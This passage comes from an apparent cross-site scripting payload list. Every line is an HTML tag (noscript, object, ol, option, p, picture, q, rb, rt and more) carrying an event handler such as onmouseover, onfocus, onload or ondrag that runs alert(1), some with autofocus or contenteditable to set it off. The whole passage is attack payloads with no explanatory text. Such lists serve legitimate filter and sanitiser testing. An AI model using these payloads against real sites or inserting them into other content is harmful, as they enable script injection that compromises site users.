3282 | <noscript onmouseover="alert(1)">test</noscript>
3283 | <noscript onmouseup="alert(1)">test</noscript>
3284 | <noscript onpaste="alert(1)" contenteditable>test</noscript>
3285 | <object data=/ onload=alert(1)>
3286 | <object data=/ onreadystatechange=alert(1)>
3287 | <object draggable="true" ondrag="alert(1)">test</object>
3288 | <object draggable="true" ondragend="alert(1)">test</object>
3289 | <object draggable="true" ondragenter="alert(1)">test</object>
3290 | <object draggable="true" ondragleave="alert(1)">test</object>
3291 | <object draggable="true" ondragstart="alert(1)">test</object>
3292 | <object id=x onfocus=alert(1) type=text/html>
3293 | <object id=x onfocusin=alert(1) type=text/html>
3294 | <object id=x tabindex=1 onactivate=alert(1)></object>
3295 | <object id=x tabindex=1 onbeforeactivate=alert(1)></object>
3296 | <object id=x tabindex=1 onbeforedeactivate=alert(1)></object><input autofocus>
3297 | <object id=x tabindex=1 ondeactivate=alert(1)></object><input id=y autofocus>
3298 | <object onbeforecopy="alert(1)" contenteditable>test</object>
3299 | <object onbeforecut="alert(1)" contenteditable>test</object>
3300 | <object onbeforepaste="alert(1)" contenteditable>test</object>
3301 | <object onblur=alert(1) tabindex=1 id=x></object><input autofocus>
3302 | <object onclick="alert(1)">test</object>
3303 | <object oncontextmenu="alert(1)">test</object>
3304 | <object oncopy="alert(1)" contenteditable>test</object>
3305 | <object oncut="alert(1)" contenteditable>test</object>
3306 | <object ondblclick="alert(1)">test</object>
3307 | <object onerror=alert(1) data=1 type=image/gif>
3308 | <object onfocusout=alert(1) tabindex=1 id=x></object><input autofocus>
3309 | <object onkeydown="alert(1)" contenteditable>test</object>
3310 | <object onkeypress="alert(1)" contenteditable>test</object>
3311 | <object onkeyup="alert(1)" contenteditable>test</object>
3312 | <object onmousedown="alert(1)">test</object>
3313 | <object onmouseenter="alert(1)">test</object>
3314 | <object onmouseleave="alert(1)">test</object>
3315 | <object onmousemove="alert(1)">test</object>
3316 | <object onmouseout="alert(1)">test</object>
3317 | <object onmouseover="alert(1)">test</object>
3318 | <object onmouseup="alert(1)">test</object>
3319 | <object onpaste="alert(1)" contenteditable>test</object>
3320 | <ol draggable="true" ondrag="alert(1)">test</ol>
3321 | <ol draggable="true" ondragend="alert(1)">test</ol>
3322 | <ol draggable="true" ondragenter="alert(1)">test</ol>
3323 | <ol draggable="true" ondragleave="alert(1)">test</ol>
3324 | <ol draggable="true" ondragstart="alert(1)">test</ol>
3325 | <ol id=x tabindex=1 onactivate=alert(1)></ol>
3326 | <ol id=x tabindex=1 onbeforeactivate=alert(1)></ol>
3327 | <ol id=x tabindex=1 onbeforedeactivate=alert(1)></ol><input autofocus>
3328 | <ol id=x tabindex=1 ondeactivate=alert(1)></ol><input id=y autofocus>
3329 | <ol id=x tabindex=1 onfocus=alert(1)></ol>
3330 | <ol id=x tabindex=1 onfocusin=alert(1)></ol>
3331 | <ol onbeforecopy="alert(1)" contenteditable>test</ol>
3332 | <ol onbeforecut="alert(1)" contenteditable>test</ol>
3333 | <ol onbeforepaste="alert(1)" contenteditable>test</ol>
3334 | <ol onblur=alert(1) tabindex=1 id=x></ol><input autofocus>
3335 | <ol onclick="alert(1)">test</ol>
3336 | <ol oncontextmenu="alert(1)">test</ol>
3337 | <ol oncopy="alert(1)" contenteditable>test</ol>
3338 | <ol oncut="alert(1)" contenteditable>test</ol>
3339 | <ol ondblclick="alert(1)">test</ol>
3340 | <ol onfocusout=alert(1) tabindex=1 id=x></ol><input autofocus>
3341 | <ol onkeydown="alert(1)" contenteditable>test</ol>
3342 | <ol onkeypress="alert(1)" contenteditable>test</ol>
3343 | <ol onkeyup="alert(1)" contenteditable>test</ol>
3344 | <ol onmousedown="alert(1)">test</ol>
3345 | <ol onmouseenter="alert(1)">test</ol>
3346 | <ol onmouseleave="alert(1)">test</ol>
3347 | <ol onmousemove="alert(1)">test</ol>
3348 | <ol onmouseout="alert(1)">test</ol>
3349 | <ol onmouseover="alert(1)">test</ol>
3350 | <ol onmouseup="alert(1)">test</ol>
3351 | <ol onpaste="alert(1)" contenteditable>test</ol>
3352 | <optgroup draggable="true" ondrag="alert(1)">test</optgroup>
3353 | <optgroup draggable="true" ondragend="alert(1)">test</optgroup>
3354 | <optgroup draggable="true" ondragenter="alert(1)">test</optgroup>
3355 | <optgroup draggable="true" ondragleave="alert(1)">test</optgroup>
3356 | <optgroup draggable="true" ondragstart="alert(1)">test</optgroup>
3357 | <optgroup id=x tabindex=1 onactivate=alert(1)></optgroup>
3358 | <optgroup id=x tabindex=1 onbeforeactivate=alert(1)></optgroup>
3359 | <optgroup id=x tabindex=1 onbeforedeactivate=alert(1)></optgroup><input autofocus>
3360 | <optgroup id=x tabindex=1 ondeactivate=alert(1)></optgroup><input id=y autofocus>
3361 | <optgroup id=x tabindex=1 onfocus=alert(1)></optgroup>
3362 | <optgroup id=x tabindex=1 onfocusin=alert(1)></optgroup>
3363 | <optgroup onbeforecopy="alert(1)" contenteditable>test</optgroup>
3364 | <optgroup onbeforecut="alert(1)" contenteditable>test</optgroup>
3365 | <optgroup onbeforepaste="alert(1)" contenteditable>test</optgroup>
3366 | <optgroup onblur=alert(1) tabindex=1 id=x></optgroup><input autofocus>
3367 | <optgroup onclick="alert(1)">test</optgroup>
3368 | <optgroup oncontextmenu="alert(1)">test</optgroup>
3369 | <optgroup oncopy="alert(1)" contenteditable>test</optgroup>
3370 | <optgroup oncut="alert(1)" contenteditable>test</optgroup>
3371 | <optgroup ondblclick="alert(1)">test</optgroup>
3372 | <optgroup onfocusout=alert(1) tabindex=1 id=x></optgroup><input autofocus>
3373 | <optgroup onkeydown="alert(1)" contenteditable>test</optgroup>
3374 | <optgroup onkeypress="alert(1)" contenteditable>test</optgroup>
3375 | <optgroup onkeyup="alert(1)" contenteditable>test</optgroup>
3376 | <optgroup onmousedown="alert(1)">test</optgroup>
3377 | <optgroup onmouseenter="alert(1)">test</optgroup>
3378 | <optgroup onmouseleave="alert(1)">test</optgroup>
3379 | <optgroup onmousemove="alert(1)">test</optgroup>
3380 | <optgroup onmouseout="alert(1)">test</optgroup>
3381 | <optgroup onmouseover="alert(1)">test</optgroup>
3382 | <optgroup onmouseup="alert(1)">test</optgroup>
3383 | <optgroup onpaste="alert(1)" contenteditable>test</optgroup>
3384 | <option draggable="true" ondrag="alert(1)">test</option>
3385 | <option draggable="true" ondragend="alert(1)">test</option>
3386 | <option draggable="true" ondragenter="alert(1)">test</option>
3387 | <option draggable="true" ondragleave="alert(1)">test</option>
3388 | <option draggable="true" ondragstart="alert(1)">test</option>
3389 | <option id=x tabindex=1 onactivate=alert(1)></option>
3390 | <option id=x tabindex=1 onbeforeactivate=alert(1)></option>
3391 | <option id=x tabindex=1 onbeforedeactivate=alert(1)></option><input autofocus>
3392 | <option id=x tabindex=1 ondeactivate=alert(1)></option><input id=y autofocus>
3393 | <option id=x tabindex=1 onfocus=alert(1)></option>
3394 | <option id=x tabindex=1 onfocusin=alert(1)></option>
3395 | <option onbeforecopy="alert(1)" contenteditable>test</option>
3396 | <option onbeforecut="alert(1)" contenteditable>test</option>
3397 | <option onbeforepaste="alert(1)" contenteditable>test</option>
3398 | <option onblur=alert(1) tabindex=1 id=x></option><input autofocus>
3399 | <option onclick="alert(1)">test</option>
3400 | <option oncontextmenu="alert(1)">test</option>
3401 | <option oncopy="alert(1)" contenteditable>test</option>
3402 | <option oncut="alert(1)" contenteditable>test</option>
3403 | <option ondblclick="alert(1)">test</option>
3404 | <option onfocusout=alert(1) tabindex=1 id=x></option><input autofocus>
3405 | <option onkeydown="alert(1)" contenteditable>test</option>
3406 | <option onkeypress="alert(1)" contenteditable>test</option>
3407 | <option onkeyup="alert(1)" contenteditable>test</option>
3408 | <option onmousedown="alert(1)">test</option>
3409 | <option onmouseenter="alert(1)">test</option>
3410 | <option onmouseleave="alert(1)">test</option>
3411 | <option onmousemove="alert(1)">test</option>
3412 | <option onmouseout="alert(1)">test</option>
3413 | <option onmouseover="alert(1)">test</option>
3414 | <option onmouseup="alert(1)">test</option>
3415 | <option onpaste="alert(1)" contenteditable>test</option>
3416 | <output draggable="true" ondrag="alert(1)">test</output>
3417 | <output draggable="true" ondragend="alert(1)">test</output>
3418 | <output draggable="true" ondragenter="alert(1)">test</output>
3419 | <output draggable="true" ondragleave="alert(1)">test</output>
3420 | <output draggable="true" ondragstart="alert(1)">test</output>
3421 | <output id=x tabindex=1 onactivate=alert(1)></output>
3422 | <output id=x tabindex=1 onbeforeactivate=alert(1)></output>
3423 | <output id=x tabindex=1 onbeforedeactivate=alert(1)></output><input autofocus>
3424 | <output id=x tabindex=1 ondeactivate=alert(1)></output><input id=y autofocus>
3425 | <output id=x tabindex=1 onfocus=alert(1)></output>
3426 | <output id=x tabindex=1 onfocusin=alert(1)></output>
3427 | <output onbeforecopy="alert(1)" contenteditable>test</output>
3428 | <output onbeforecut="alert(1)" contenteditable>test</output>
3429 | <output onbeforepaste="alert(1)" contenteditable>test</output>
3430 | <output onblur=alert(1) tabindex=1 id=x></output><input autofocus>
3431 | <output onclick="alert(1)">test</output>
3432 | <output oncontextmenu="alert(1)">test</output>
3433 | <output oncopy="alert(1)" contenteditable>test</output>
3434 | <output oncut="alert(1)" contenteditable>test</output>
3435 | <output ondblclick="alert(1)">test</output>
3436 | <output onfocusout=alert(1) tabindex=1 id=x></output><input autofocus>
3437 | <output onkeydown="alert(1)" contenteditable>test</output>
3438 | <output onkeypress="alert(1)" contenteditable>test</output>
3439 | <output onkeyup="alert(1)" contenteditable>test</output>
3440 | <output onmousedown="alert(1)">test</output>
3441 | <output onmouseenter="alert(1)">test</output>
3442 | <output onmouseleave="alert(1)">test</output>
3443 | <output onmousemove="alert(1)">test</output>
3444 | <output onmouseout="alert(1)">test</output>
3445 | <output onmouseover="alert(1)">test</output>
3446 | <output onmouseup="alert(1)">test</output>
3447 | <output onpaste="alert(1)" contenteditable>test</output>
3448 | <p draggable="true" ondrag="alert(1)">test</p>
3449 | <p draggable="true" ondragend="alert(1)">test</p>
3450 | <p draggable="true" ondragenter="alert(1)">test</p>
3451 | <p draggable="true" ondragleave="alert(1)">test</p>
3452 | <p draggable="true" ondragstart="alert(1)">test</p>
3453 | <p id=x tabindex=1 onactivate=alert(1)></p>
3454 | <p id=x tabindex=1 onbeforeactivate=alert(1)></p>
3455 | <p id=x tabindex=1 onbeforedeactivate=alert(1)></p><input autofocus>
3456 | <p id=x tabindex=1 ondeactivate=alert(1)></p><input id=y autofocus>
3457 | <p id=x tabindex=1 onfocus=alert(1)></p>
3458 | <p id=x tabindex=1 onfocusin=alert(1)></p>
3459 | <p onbeforecopy="alert(1)" contenteditable>test</p>
3460 | <p onbeforecut="alert(1)" contenteditable>test</p>
3461 | <p onbeforepaste="alert(1)" contenteditable>test</p>
3462 | <p onblur=alert(1) tabindex=1 id=x></p><input autofocus>
3463 | <p onclick="alert(1)">test</p>
3464 | <p oncontextmenu="alert(1)">test</p>
3465 | <p oncopy="alert(1)" contenteditable>test</p>
3466 | <p oncut="alert(1)" contenteditable>test</p>
3467 | <p ondblclick="alert(1)">test</p>
3468 | <p onfocusout=alert(1) tabindex=1 id=x></p><input autofocus>
3469 | <p onkeydown="alert(1)" contenteditable>test</p>
3470 | <p onkeypress="alert(1)" contenteditable>test</p>
3471 | <p onkeyup="alert(1)" contenteditable>test</p>
3472 | <p onmousedown="alert(1)">test</p>
3473 | <p onmouseenter="alert(1)">test</p>
3474 | <p onmouseleave="alert(1)">test</p>
3475 | <p onmousemove="alert(1)">test</p>
3476 | <p onmouseout="alert(1)">test</p>
3477 | <p onmouseover="alert(1)">test</p>
3478 | <p onmouseup="alert(1)">test</p>
3479 | <p onpaste="alert(1)" contenteditable>test</p>
3480 | <param draggable="true" ondrag="alert(1)">test</param>
3481 | <param draggable="true" ondragend="alert(1)">test</param>
3482 | <param draggable="true" ondragenter="alert(1)">test</param>
3483 | <param draggable="true" ondragleave="alert(1)">test</param>
3484 | <param draggable="true" ondragstart="alert(1)">test</param>
3485 | <param id=x tabindex=1 onactivate=alert(1)></param>
3486 | <param id=x tabindex=1 onbeforeactivate=alert(1)></param>
3487 | <param id=x tabindex=1 onbeforedeactivate=alert(1)></param><input autofocus>
3488 | <param id=x tabindex=1 ondeactivate=alert(1)></param><input id=y autofocus>
3489 | <param id=x tabindex=1 onfocus=alert(1)></param>
3490 | <param id=x tabindex=1 onfocusin=alert(1)></param>
3491 | <param onbeforecopy="alert(1)" contenteditable>test</param>
3492 | <param onbeforecut="alert(1)" contenteditable>test</param>
3493 | <param onbeforepaste="alert(1)" contenteditable>test</param>
3494 | <param onblur=alert(1) tabindex=1 id=x></param><input autofocus>
3495 | <param onclick="alert(1)">test</param>
3496 | <param oncontextmenu="alert(1)">test</param>
3497 | <param oncopy="alert(1)" contenteditable>test</param>
3498 | <param oncut="alert(1)" contenteditable>test</param>
3499 | <param ondblclick="alert(1)">test</param>
3500 | <param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>
3501 | <param onkeydown="alert(1)" contenteditable>test</param>
3502 | <param onkeypress="alert(1)" contenteditable>test</param>
3503 | <param onkeyup="alert(1)" contenteditable>test</param>
3504 | <param onmousedown="alert(1)">test</param>
3505 | <param onmouseenter="alert(1)">test</param>
3506 | <param onmouseleave="alert(1)">test</param>
3507 | <param onmousemove="alert(1)">test</param>
3508 | <param onmouseout="alert(1)">test</param>
3509 | <param onmouseover="alert(1)">test</param>
3510 | <param onmouseup="alert(1)">test</param>
3511 | <param onpaste="alert(1)" contenteditable>test</param>
3512 | <picture draggable="true" ondrag="alert(1)">test</picture>
3513 | <picture draggable="true" ondragend="alert(1)">test</picture>
3514 | <picture draggable="true" ondragenter="alert(1)">test</picture>
3515 | <picture draggable="true" ondragleave="alert(1)">test</picture>
3516 | <picture draggable="true" ondragstart="alert(1)">test</picture>
3517 | <picture id=x tabindex=1 onactivate=alert(1)></picture>
3518 | <picture id=x tabindex=1 onbeforeactivate=alert(1)></picture>
3519 | <picture id=x tabindex=1 onbeforedeactivate=alert(1)></picture><input autofocus>
3520 | <picture id=x tabindex=1 ondeactivate=alert(1)></picture><input id=y autofocus>
3521 | <picture id=x tabindex=1 onfocus=alert(1)></picture>
3522 | <picture id=x tabindex=1 onfocusin=alert(1)></picture>
3523 | <picture onbeforecopy="alert(1)" contenteditable>test</picture>
3524 | <picture onbeforecut="alert(1)" contenteditable>test</picture>
3525 | <picture onbeforepaste="alert(1)" contenteditable>test</picture>
3526 | <picture onblur=alert(1) tabindex=1 id=x></picture><input autofocus>
3527 | <picture onclick="alert(1)">test</picture>
3528 | <picture oncontextmenu="alert(1)">test</picture>
3529 | <picture oncopy="alert(1)" contenteditable>test</picture>
3530 | <picture oncut="alert(1)" contenteditable>test</picture>
3531 | <picture ondblclick="alert(1)">test</picture>
3532 | <picture onfocusout=alert(1) tabindex=1 id=x></picture><input autofocus>
3533 | <picture onkeydown="alert(1)" contenteditable>test</picture>
3534 | <picture onkeypress="alert(1)" contenteditable>test</picture>
3535 | <picture onkeyup="alert(1)" contenteditable>test</picture>
3536 | <picture onmousedown="alert(1)">test</picture>
3537 | <picture onmouseenter="alert(1)">test</picture>
3538 | <picture onmouseleave="alert(1)">test</picture>
3539 | <picture onmousemove="alert(1)">test</picture>
3540 | <picture onmouseout="alert(1)">test</picture>
3541 | <picture onmouseover="alert(1)">test</picture>
3542 | <picture onmouseup="alert(1)">test</picture>
3543 | <picture onpaste="alert(1)" contenteditable>test</picture>
3544 | <picture><source srcset="validimage.png"><image onload=alert(1)></picture>
3545 | <picture><source srcset="validimage.png"><image onloadend=alert(1)></picture>
3546 | <picture><source srcset="validimage.png"><image onloadstart=alert(1)></picture>
3547 | <picture><source srcset="validimage.png"><img onload=alert(1)></picture>
3548 | <picture><source srcset="validimage.png"><img onloadend=alert(1)></picture>
3549 | <picture><source srcset="validimage.png"><img onloadstart=alert(1)></picture>
3550 | <plaintext draggable="true" ondrag="alert(1)">test</plaintext>
3551 | <plaintext draggable="true" ondragend="alert(1)">test</plaintext>
3552 | <plaintext draggable="true" ondragenter="alert(1)">test</plaintext>
3553 | <plaintext draggable="true" ondragleave="alert(1)">test</plaintext>
3554 | <plaintext draggable="true" ondragstart="alert(1)">test</plaintext>
3555 | <plaintext id=x tabindex=1 onactivate=alert(1)></plaintext>
3556 | <plaintext id=x tabindex=1 onbeforeactivate=alert(1)></plaintext>
3557 | <plaintext id=x tabindex=1 onbeforedeactivate=alert(1)></plaintext><input autofocus>
3558 | <plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>
3559 | <plaintext id=x tabindex=1 onfocus=alert(1)></plaintext>
3560 | <plaintext id=x tabindex=1 onfocusin=alert(1)></plaintext>
3561 | <plaintext onbeforecopy="alert(1)" contenteditable>test</plaintext>
3562 | <plaintext onbeforecut="alert(1)" contenteditable>test</plaintext>
3563 | <plaintext onbeforepaste="alert(1)" contenteditable>test</plaintext>
3564 | <plaintext onblur=alert(1) tabindex=1 id=x></plaintext><input autofocus>
3565 | <plaintext onclick="alert(1)">test</plaintext>
3566 | <plaintext oncontextmenu="alert(1)">test</plaintext>
3567 | <plaintext oncopy="alert(1)" contenteditable>test</plaintext>
3568 | <plaintext oncut="alert(1)" contenteditable>test</plaintext>
3569 | <plaintext ondblclick="alert(1)">test</plaintext>
3570 | <plaintext onfocusout=alert(1) tabindex=1 id=x></plaintext><input autofocus>
3571 | <plaintext onkeydown="alert(1)" contenteditable>test</plaintext>
3572 | <plaintext onkeypress="alert(1)" contenteditable>test</plaintext>
3573 | <plaintext onkeyup="alert(1)" contenteditable>test</plaintext>
3574 | <plaintext onmousedown="alert(1)">test</plaintext>
3575 | <plaintext onmouseenter="alert(1)">test</plaintext>
3576 | <plaintext onmouseleave="alert(1)">test</plaintext>
3577 | <plaintext onmousemove="alert(1)">test</plaintext>
3578 | <plaintext onmouseout="alert(1)">test</plaintext>
3579 | <plaintext onmouseover="alert(1)">test</plaintext>
3580 | <plaintext onmouseup="alert(1)">test</plaintext>
3581 | <plaintext onpaste="alert(1)" contenteditable>test</plaintext>
3582 | <pre draggable="true" ondrag="alert(1)">test</pre>
3583 | <pre draggable="true" ondragend="alert(1)">test</pre>
3584 | <pre draggable="true" ondragenter="alert(1)">test</pre>
3585 | <pre draggable="true" ondragleave="alert(1)">test</pre>
3586 | <pre draggable="true" ondragstart="alert(1)">test</pre>
3587 | <pre id=x tabindex=1 onactivate=alert(1)></pre>
3588 | <pre id=x tabindex=1 onbeforeactivate=alert(1)></pre>
3589 | <pre id=x tabindex=1 onbeforedeactivate=alert(1)></pre><input autofocus>
3590 | <pre id=x tabindex=1 ondeactivate=alert(1)></pre><input id=y autofocus>
3591 | <pre id=x tabindex=1 onfocus=alert(1)></pre>
3592 | <pre id=x tabindex=1 onfocusin=alert(1)></pre>
3593 | <pre onbeforecopy="alert(1)" contenteditable>test</pre>
3594 | <pre onbeforecut="alert(1)" contenteditable>test</pre>
3595 | <pre onbeforepaste="alert(1)" contenteditable>test</pre>
3596 | <pre onblur=alert(1) tabindex=1 id=x></pre><input autofocus>
3597 | <pre onclick="alert(1)">test</pre>
3598 | <pre oncontextmenu="alert(1)">test</pre>
3599 | <pre oncopy="alert(1)" contenteditable>test</pre>
3600 | <pre oncut="alert(1)" contenteditable>test</pre>
3601 | <pre ondblclick="alert(1)">test</pre>
3602 | <pre onfocusout=alert(1) tabindex=1 id=x></pre><input autofocus>
3603 | <pre onkeydown="alert(1)" contenteditable>test</pre>
3604 | <pre onkeypress="alert(1)" contenteditable>test</pre>
3605 | <pre onkeyup="alert(1)" contenteditable>test</pre>
3606 | <pre onmousedown="alert(1)">test</pre>
3607 | <pre onmouseenter="alert(1)">test</pre>
3608 | <pre onmouseleave="alert(1)">test</pre>
3609 | <pre onmousemove="alert(1)">test</pre>
3610 | <pre onmouseout="alert(1)">test</pre>
3611 | <pre onmouseover="alert(1)">test</pre>
3612 | <pre onmouseup="alert(1)">test</pre>
3613 | <pre onpaste="alert(1)" contenteditable>test</pre>
3614 | <progress draggable="true" ondrag="alert(1)">test</progress>
3615 | <progress draggable="true" ondragend="alert(1)">test</progress>
3616 | <progress draggable="true" ondragenter="alert(1)">test</progress>
3617 | <progress draggable="true" ondragleave="alert(1)">test</progress>
3618 | <progress draggable="true" ondragstart="alert(1)">test</progress>
3619 | <progress id=x tabindex=1 onactivate=alert(1)></progress>
3620 | <progress id=x tabindex=1 onbeforeactivate=alert(1)></progress>
3621 | <progress id=x tabindex=1 onbeforedeactivate=alert(1)></progress><input autofocus>
3622 | <progress id=x tabindex=1 ondeactivate=alert(1)></progress><input id=y autofocus>
3623 | <progress id=x tabindex=1 onfocus=alert(1)></progress>
3624 | <progress id=x tabindex=1 onfocusin=alert(1)></progress>
3625 | <progress onbeforecopy="alert(1)" contenteditable>test</progress>
3626 | <progress onbeforecut="alert(1)" contenteditable>test</progress>
3627 | <progress onbeforepaste="alert(1)" contenteditable>test</progress>
3628 | <progress onblur=alert(1) tabindex=1 id=x></progress><input autofocus>
3629 | <progress onclick="alert(1)">test</progress>
3630 | <progress oncontextmenu="alert(1)">test</progress>
3631 | <progress oncopy="alert(1)" contenteditable>test</progress>
3632 | <progress oncut="alert(1)" contenteditable>test</progress>
3633 | <progress ondblclick="alert(1)">test</progress>
3634 | <progress onfocusout=alert(1) tabindex=1 id=x></progress><input autofocus>
3635 | <progress onkeydown="alert(1)" contenteditable>test</progress>
3636 | <progress onkeypress="alert(1)" contenteditable>test</progress>
3637 | <progress onkeyup="alert(1)" contenteditable>test</progress>
3638 | <progress onmousedown="alert(1)">test</progress>
3639 | <progress onmouseenter="alert(1)">test</progress>
3640 | <progress onmouseleave="alert(1)">test</progress>
3641 | <progress onmousemove="alert(1)">test</progress>
3642 | <progress onmouseout="alert(1)">test</progress>
3643 | <progress onmouseover="alert(1)">test</progress>
3644 | <progress onmouseup="alert(1)">test</progress>
3645 | <progress onpaste="alert(1)" contenteditable>test</progress>
3646 | <q draggable="true" ondrag="alert(1)">test</q>
3647 | <q draggable="true" ondragend="alert(1)">test</q>
3648 | <q draggable="true" ondragenter="alert(1)">test</q>
3649 | <q draggable="true" ondragleave="alert(1)">test</q>
3650 | <q draggable="true" ondragstart="alert(1)">test</q>
3651 | <q id=x tabindex=1 onactivate=alert(1)></q>
3652 | <q id=x tabindex=1 onbeforeactivate=alert(1)></q>
3653 | <q id=x tabindex=1 onbeforedeactivate=alert(1)></q><input autofocus>
3654 | <q id=x tabindex=1 ondeactivate=alert(1)></q><input id=y autofocus>
3655 | <q id=x tabindex=1 onfocus=alert(1)></q>
3656 | <q id=x tabindex=1 onfocusin=alert(1)></q>
3657 | <q onbeforecopy="alert(1)" contenteditable>test</q>
3658 | <q onbeforecut="alert(1)" contenteditable>test</q>
3659 | <q onbeforepaste="alert(1)" contenteditable>test</q>
3660 | <q onblur=alert(1) tabindex=1 id=x></q><input autofocus>
3661 | <q onclick="alert(1)">test</q>
3662 | <q oncontextmenu="alert(1)">test</q>
3663 | <q oncopy="alert(1)" contenteditable>test</q>
3664 | <q oncut="alert(1)" contenteditable>test</q>
3665 | <q ondblclick="alert(1)">test</q>
3666 | <q onfocusout=alert(1) tabindex=1 id=x></q><input autofocus>
3667 | <q onkeydown="alert(1)" contenteditable>test</q>
3668 | <q onkeypress="alert(1)" contenteditable>test</q>
3669 | <q onkeyup="alert(1)" contenteditable>test</q>
3670 | <q onmousedown="alert(1)">test</q>
3671 | <q onmouseenter="alert(1)">test</q>
3672 | <q onmouseleave="alert(1)">test</q>
3673 | <q onmousemove="alert(1)">test</q>
3674 | <q onmouseout="alert(1)">test</q>
3675 | <q onmouseover="alert(1)">test</q>
3676 | <q onmouseup="alert(1)">test</q>
3677 | <q onpaste="alert(1)" contenteditable>test</q>
3678 | <rb draggable="true" ondrag="alert(1)">test</rb>
3679 | <rb draggable="true" ondragend="alert(1)">test</rb>
3680 | <rb draggable="true" ondragenter="alert(1)">test</rb>
3681 | <rb draggable="true" ondragleave="alert(1)">test</rb>
3682 | <rb draggable="true" ondragstart="alert(1)">test</rb>
3683 | <rb id=x tabindex=1 onactivate=alert(1)></rb>
3684 | <rb id=x tabindex=1 onbeforeactivate=alert(1)></rb>
3685 | <rb id=x tabindex=1 onbeforedeactivate=alert(1)></rb><input autofocus>
3686 | <rb id=x tabindex=1 ondeactivate=alert(1)></rb><input id=y autofocus>
3687 | <rb id=x tabindex=1 onfocus=alert(1)></rb>
3688 | <rb id=x tabindex=1 onfocusin=alert(1)></rb>
3689 | <rb onbeforecopy="alert(1)" contenteditable>test</rb>
3690 | <rb onbeforecut="alert(1)" contenteditable>test</rb>
3691 | <rb onbeforepaste="alert(1)" contenteditable>test</rb>
3692 | <rb onblur=alert(1) tabindex=1 id=x></rb><input autofocus>
3693 | <rb onclick="alert(1)">test</rb>
3694 | <rb oncontextmenu="alert(1)">test</rb>
3695 | <rb oncopy="alert(1)" contenteditable>test</rb>
3696 | <rb oncut="alert(1)" contenteditable>test</rb>
3697 | <rb ondblclick="alert(1)">test</rb>
3698 | <rb onfocusout=alert(1) tabindex=1 id=x></rb><input autofocus>
3699 | <rb onkeydown="alert(1)" contenteditable>test</rb>
3700 | <rb onkeypress="alert(1)" contenteditable>test</rb>
3701 | <rb onkeyup="alert(1)" contenteditable>test</rb>
3702 | <rb onmousedown="alert(1)">test</rb>
3703 | <rb onmouseenter="alert(1)">test</rb>
3704 | <rb onmouseleave="alert(1)">test</rb>
3705 | <rb onmousemove="alert(1)">test</rb>
3706 | <rb onmouseout="alert(1)">test</rb>
3707 | <rb onmouseover="alert(1)">test</rb>
3708 | <rb onmouseup="alert(1)">test</rb>
3709 | <rb onpaste="alert(1)" contenteditable>test</rb>
3710 | <rp draggable="true" ondrag="alert(1)">test</rp>
3711 | <rp draggable="true" ondragend="alert(1)">test</rp>
3712 | <rp draggable="true" ondragenter="alert(1)">test</rp>
3713 | <rp draggable="true" ondragleave="alert(1)">test</rp>
3714 | <rp draggable="true" ondragstart="alert(1)">test</rp>
3715 | <rp id=x tabindex=1 onactivate=alert(1)></rp>
3716 | <rp id=x tabindex=1 onbeforeactivate=alert(1)></rp>
3717 | <rp id=x tabindex=1 onbeforedeactivate=alert(1)></rp><input autofocus>
3718 | <rp id=x tabindex=1 ondeactivate=alert(1)></rp><input id=y autofocus>
3719 | <rp id=x tabindex=1 onfocus=alert(1)></rp>
3720 | <rp id=x tabindex=1 onfocusin=alert(1)></rp>
3721 | <rp onbeforecopy="alert(1)" contenteditable>test</rp>
3722 | <rp onbeforecut="alert(1)" contenteditable>test</rp>
3723 | <rp onbeforepaste="alert(1)" contenteditable>test</rp>
3724 | <rp onblur=alert(1) tabindex=1 id=x></rp><input autofocus>
3725 | <rp onclick="alert(1)">test</rp>
3726 | <rp oncontextmenu="alert(1)">test</rp>
3727 | <rp oncopy="alert(1)" contenteditable>test</rp>
3728 | <rp oncut="alert(1)" contenteditable>test</rp>
3729 | <rp ondblclick="alert(1)">test</rp>
3730 | <rp onfocusout=alert(1) tabindex=1 id=x></rp><input autofocus>
3731 | <rp onkeydown="alert(1)" contenteditable>test</rp>
3732 | <rp onkeypress="alert(1)" contenteditable>test</rp>
3733 | <rp onkeyup="alert(1)" contenteditable>test</rp>
3734 | <rp onmousedown="alert(1)">test</rp>
3735 | <rp onmouseenter="alert(1)">test</rp>
3736 | <rp onmouseleave="alert(1)">test</rp>
3737 | <rp onmousemove="alert(1)">test</rp>
3738 | <rp onmouseout="alert(1)">test</rp>
3739 | <rp onmouseover="alert(1)">test</rp>
3740 | <rp onmouseup="alert(1)">test</rp>
3741 | <rp onpaste="alert(1)" contenteditable>test</rp>
3742 | <rt draggable="true" ondrag="alert(1)">test</rt>
3743 | <rt draggable="true" ondragend="alert(1)">test</rt>
3744 | <rt draggable="true" ondragenter="alert(1)">test</rt>
3745 | <rt draggable="true" ondragleave="alert(1)">test</rt>
3746 | <rt draggable="true" ondragstart="alert(1)">test</rt>
3747 | <rt id=x tabindex=1 onactivate=alert(1)></rt>
3748 | <rt id=x tabindex=1 onbeforeactivate=alert(1)></rt>
3749 | <rt id=x tabindex=1 onbeforedeactivate=alert(1)></rt><input autofocus>
3750 | <rt id=x tabindex=1 ondeactivate=alert(1)></rt><input id=y autofocus>
3751 | <rt id=x tabindex=1 onfocus=alert(1)></rt>
3752 | <rt id=x tabindex=1 onfocusin=alert(1)></rt>
3753 | <rt onbeforecopy="alert(1)" contenteditable>test</rt>
3754 | <rt onbeforecut="alert(1)" contenteditable>test</rt>
3755 | <rt onbeforepaste="alert(1)" contenteditable>test</rt>
3756 | <rt onblur=alert(1) tabindex=1 id=x></rt><input autofocus>
3757 | <rt onclick="alert(1)">test</rt>
3758 | <rt oncontextmenu="alert(1)">test</rt>
3759 | <rt oncopy="alert(1)" contenteditable>test</rt>
3760 | <rt oncut="alert(1)" contenteditable>test</rt>
3761 | <rt ondblclick="alert(1)">test</rt>
3762 | <rt onfocusout=alert(1) tabindex=1 id=x></rt><input autofocus>
3763 | <rt onkeydown="alert(1)" contenteditable>test</rt>
3764 | <rt onkeypress="alert(1)" contenteditable>test</rt>
3765 | <rt onkeyup="alert(1)" contenteditable>test</rt>
3766 | <rt onmousedown="alert(1)">test</rt>
3767 | <rt onmouseenter="alert(1)">test</rt>
3768 | <rt onmouseleave="alert(1)">test</rt>
3769 | <rt onmousemove="alert(1)">test</rt>
3770 | <rt onmouseout="alert(1)">test</rt>
3771 | <rt onmouseover="alert(1)">test</rt>
3772 | <rt onmouseup="alert(1)">test</rt>
3773 | <rt onpaste="alert(1)" contenteditable>test</rt>
3774 | <rtc draggable="true" ondrag="alert(1)">test</rtc>
3775 | <rtc draggable="true" ondragend="alert(1)">test</rtc>
